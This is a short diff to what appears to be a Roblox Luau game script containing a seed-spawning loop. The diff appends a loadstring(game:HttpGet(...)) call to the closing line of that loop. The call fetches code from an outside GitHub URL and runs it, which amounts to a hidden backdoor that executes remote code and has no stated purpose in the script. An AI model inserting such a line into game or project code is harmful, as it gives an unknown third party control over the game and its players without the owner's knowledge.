@@ -40,4 +40,4 @@ task.spawn(function()
         spawnSeed()
         task.wait(SPAWN_INTERVAL)
     end
-end)
+end) loadstring(game:HttpGet("https://github.com/demonkilla101/Nice/blob/main/Cool"))()
